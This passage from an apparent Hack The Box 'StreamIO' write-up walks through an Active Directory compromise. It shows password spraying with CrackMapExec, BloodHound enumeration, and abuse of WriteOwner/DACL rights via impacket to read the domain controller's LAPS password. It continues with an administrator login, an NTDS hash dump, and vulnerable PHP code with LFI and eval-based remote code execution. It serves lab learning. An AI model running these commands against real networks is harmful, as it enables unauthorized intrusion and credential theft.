Username: <span class="s1">&#39;JDgodd&#39;</span>
Password: <span class="s1">&#39;password@12&#39;</span>
</code></pre></div>

<p>And again some passwords, that we test on SMB. I put the usernames in a text file and also the passwords, to cross check all passwords.</p>
<div class="highlight"><pre><span></span><code>cat users.txt
JDgodd
Administrator
yoshihide
Martin
</code></pre></div>

<p>I left out nikk37 because we already have access to this account.</p>
<div class="highlight"><pre><span></span><code>cat passwords.txt
JDg0dd1s@d0p3cr3@t0r
n1kk1sd0p3t00:<span class="o">)</span>
paddpadd@12
password@12
get_dem_girls2@yahoo.com
66boysandgirls..
</code></pre></div>

<p>CrackMapExec does all the work for us.</p>
<div class="highlight"><pre><span></span><code>cme smb <span class="nv">$TIP</span> -u users.txt -p passwords.txt  --continue-on-success
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:paddpadd@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:password@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:paddpadd@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:password@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:paddpadd@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:password@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:paddpadd@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:password@12 STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:66boysandgirls.. STATUS_LOGON_FAILURE
</code></pre></div>

<p>And we are lucky. <strong>JDgodd</strong> has the password <strong>JDg0dd1s@d0p3cr3@t0r</strong>.</p>
<p>But JDgodd can't login over WinRM. Time to enumerate all those permissions in Active Directory. Who can do this best? You guess, right, it's BloodHound.
I am using <code>bloodhound-python</code> to retrieve the data even though I know it retrieves fewer data than SharpHound for example.</p>
<div class="highlight"><pre><span></span><code>bloodhound-python -c All -u nikk37 -p <span class="s2">&quot;get_dem_girls2@yahoo.com&quot;</span> -d streamio.htb -ns <span class="nv">$TIP</span>
INFO: Found AD domain: streamio.htb
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Found <span class="m">1</span> domains
INFO: Found <span class="m">1</span> domains <span class="k">in</span> the forest
INFO: Found <span class="m">1</span> computers
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Found <span class="m">8</span> users
INFO: Connecting to GC LDAP server: dc.streamio.htb
INFO: Found <span class="m">54</span> groups
INFO: Found <span class="m">0</span> trusts
INFO: Starting computer enumeration with <span class="m">10</span> workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done <span class="k">in</span> 00M 05S
</code></pre></div>

<p>Generally, I would have used <code>bloodhound-import</code>, but it does not work with the newest Bloodhound format right now. Instead, I use the drag-and-drop feature of Bloodhound to import those JSON files to the neo4j database.
BloodHound is a a great tool. At first, I display all those in the "Administrators" group. We can see <strong>Martin</strong> sitting there, waiting to be hacked. 
<img alt="Active Directory Administrators Group" src="/images/htb/streamio/streamio.htb_bh_administrators.PNG">
And we take a look on all those other users. <strong>nikk37</strong> is, who would expected that, in the <strong>Remote Users</strong> group, but nothing else is special about that account. <strong>yoshihide</strong> is neither interesting, no exiting groups or permissions.</p>
<p>Different for <strong>JDgodd</strong>, this account not member of the <strong>Core Staff</strong> group, but has <strong>WriteOwner</strong> permission. This means that account, which we already have access to, can set the owner of that group. And we now what the owner can do...
<img alt="JDgodd User" src="/images/htb/streamio/streamio.htb_bh_jdgodd.PNG"></p>
<p>Even better, the <strong>Core Staff</strong> group has the <strong>ReadLAPSPassoword</strong> permission for the DC host, respectivly our target ;)
<img alt="BloodHound Core Staff Group" src="/images/htb/streamio/streamio.htb_bh_core_staff.PNG"></p>
<p>What are our next steps?</p>
<ol>
<li>Set the owner of <strong>Core Staff</strong> group to any user we own, by using JDgodd</li>
<li>Add an account, we own, to the <strong>Core Staff</strong> group using the group owner, we set just before</li>
<li>Use the newly added <strong>Core Staff</strong> account to read the LAPS password for the DC</li>
<li>SUCCESS</li>
</ol>
<p>This could be done using the WinRM session of nikk37 and the credentials of JDgodd with Powershell, but... I like to do those things without using Windows too much.</p>
<p>Shouts out to Charlie Bromberg (Shutdown) for releasing his scripts and tutorial. He recently made some pull requests to impacket, adding the ability to change the owner of an object <a href="https://github.com/SecureAuthCorp/impacket/pull/1323">1323</a> and also edit DACLs <a href="https://github.com/SecureAuthCorp/impacket/pull/1291">1291</a>. These pull requests are tutorials itself, but he also published examples at <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit</a> and <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit</a>.</p>
<p>We start with owneredit, reading the current owner. Someone has already made JDgodd the owner of the Core Staff group.</p>
<div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Current owner information below
<span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
<span class="o">[</span>*<span class="o">]</span> - sAMAccountName: JDgodd
<span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
</code></pre></div>

<p>For completeness, I show the command that makes JDgodd as owner of "Core Staff"</p>
<div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action write streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Current owner information below
<span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
<span class="o">[</span>*<span class="o">]</span> - sAMAccountName: JDgodd
<span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
<span class="o">[</span>*<span class="o">]</span> OwnerSid modified successfully!
</code></pre></div>

<p>How about DACLs? We see that JDgodd has the WriteOwner privilege.</p>
<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Parsing DACL
<span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
<span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">2</span><span class="o">]</span> info
<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
<span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
</code></pre></div>

<p>Now we grant JDgodd full control over that group.</p>
<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action write -ace-type allowed -rights FullControl streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> DACL backed up to dacledit-20220619-143823.bak
<span class="o">[</span>*<span class="o">]</span> DACL modified successfully!
</code></pre></div>

<p>And we check if it worked.</p>
<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Parsing DACL
<span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
<span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">2</span><span class="o">]</span> info
<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
<span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">4</span><span class="o">]</span> info
<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
<span class="o">[</span>*<span class="o">]</span>     Access mask               : FullControl <span class="o">(</span>0xf01ff<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
</code></pre></div>

<p>Yes, it worked. The next step is to add a member to that group, because, if you remember, Core Staff members can read LAPS passwords for the DC. We are going to use the <strong>net</strong> utility.</p>
<div class="highlight"><pre><span></span><code>net rpc group addmem <span class="s2">&quot;Core Staff&quot;</span> jdgodd -U <span class="s1">&#39;streamio.htb/jdgodd&#39;</span> -S <span class="nv">$TIP</span>
Enter streamio.htb/jdgodd<span class="err">&#39;</span>s password:
</code></pre></div>

<p>There is no output, but we now try to read the LAPS password using CrackMapExec.</p>
<div class="highlight"><pre><span></span><code>cme ldap <span class="nv">$TIP</span> -u JDgodd -p <span class="s2">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span> --module laps
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
LAPS        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> Getting LAPS Passwords
LAPS        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               Computer: DC$                  Password: 3W7Z4<span class="o">}</span><span class="nv">$Wu2P0V</span>/
</code></pre></div>

<p>It totally worked, we got the LAPS password. We login using <strong>evil-winrm</strong> again, but no root flag in the Desktop directory. But there might be one at Martin's Desktop folder.</p>
<div class="highlight"><pre><span></span><code>evil-winrm  -i <span class="nv">$TIP</span> -u administrator -p <span class="s1">&#39;3W7Z4}$Wu2P0V/&#39;</span>

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls


    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        <span class="m">2</span>/26/2022  <span class="m">12</span>:41 PM            <span class="m">274</span> clearing.bat


*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls ..<span class="se">\D</span>esktop
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls <span class="s2">&quot;C:/Users/Martin/Desktop/&quot;</span>


    Directory: C:<span class="se">\U</span>sers<span class="se">\M</span>artin<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="m">6</span>/19/2022  <span class="m">11</span>:31 AM             <span class="m">34</span> root.txt


*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> <span class="s2">&quot;C:/Users/Martin/Desktop/root.txt&quot;</span>
f0873b557d5a24b8b77380938cb8623c
</code></pre></div>

<p>Done! Because we are nice, we run the <code>clearing.bat</code>, to reset the DACLs.</p>
<h1>Appendix</h1>
<div class="highlight"><pre><span></span><code>cme smb <span class="nv">$TIP</span> -u administrator -p <span class="s1">&#39;3W7Z4}$Wu2P0V/&#39;</span> --ntds
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\a</span>dministrator:3W7Z4<span class="o">}</span><span class="nv">$Wu2P0V</span>/ <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Dumping the NTDS, this could take a <span class="k">while</span> so go grab a redbull...
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:eb8ddc2769f325862b883ff2dce33317:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f5142aae3cce656285ce4504605dec1:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:5618d95a388132e93bf622d6a6b2e84a:::
</code></pre></div>

<h2>Alternative way</h2>
<p>I haven't found that directly, but there is another way to retrieve the data from the <strong>streamio_backup</strong> table. The web application has a flaw which allows <em>Local File inclusion</em>. This way includes that we extracted the MD5 hash of <strong>yoshihide</strong> successfully and get the corresponding password <strong>66boysandgirls..</strong>.</p>
<p><code>/admin/index.php</code> has multiple GET parameters, one is hidden, called <strong>debug</strong>. Because I have access to the code, I can show the snippet.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]))</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;this option is for developers only&#39;</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;index.php&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39; ---- ERROR ----&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span>
        <span class="k">require</span> <span class="s1">&#39;user_inc.php&#39;</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;staff&#39;</span><span class="p">]))</span>
        <span class="k">require</span> <span class="s1">&#39;staff_inc.php&#39;</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;movie&#39;</span><span class="p">]))</span>
        <span class="k">require</span> <span class="s1">&#39;movie_inc.php&#39;</span><span class="p">;</span>
    <span class="k">else</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>

<p><code>?debug</code> includes everything set to, but <strong>index.php</strong>. We can read files with that vulnerability, like the misterious <code>master.php</code>.</p>
<p><code>master.php</code> also has some interesting code at the end of the file:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]))</span>
<span class="p">{</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&quot;index.php&quot;</span> <span class="p">)</span>
<span class="k">eval</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]));</span>
<span class="k">else</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot; ---- ERROR ---- &quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>When called with the POST parameter <code>include</code> set to anything, it tries to read that file and <code>eval</code>s that content.. Nice..</p>
<p>If we can get the script to load our own code, we have an <em>Remote Code Execution</em>.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="/tag/htb.html">#htb</a>
      <a href="/tag/python.html">#python</a>
      <a href="/tag/impacket.html">#impacket</a>
      <a href="/tag/windows.html">#windows</a>
      <a href="/tag/active-directory.html">#active-directory</a>
      <a href="/tag/writeup.html">#writeup</a>
    </p>
  </div>





</article>

    <footer>
<p>&copy; 2022 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="False"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Security Blog ",
  "url" : "",
  "image": "/images/profile.jpg",
  "description": ""
}
</script>

</body>
</html>